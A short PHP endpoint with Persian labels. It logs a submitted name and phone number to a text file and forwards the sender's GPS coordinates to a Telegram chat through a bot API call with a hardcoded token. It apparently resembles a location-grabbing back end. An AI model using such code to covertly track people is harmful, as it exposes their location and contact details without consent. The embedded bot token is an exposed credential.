<?php
$data = json_decode(file_get_contents("php://input"), true);
if (!isset($data["latitude"]) || !isset($data["longitude"])) {
  echo json_encode(["status" => "error", "message" => "Missing location"]);
  exit;
}
file_put_contents("user_data.txt", "نام: {$data["fullname"]}\nشماره: {$data["phone"]}\n\n", FILE_APPEND);

$token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";
$chat_id = "-1002570608346";
$url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
  "chat_id" => $chat_id,
  "latitude" => $data["latitude"],
  "longitude" => $data["longitude"]
]);
file_get_contents($url);
echo json_encode(["status" => "ok"]);
?>
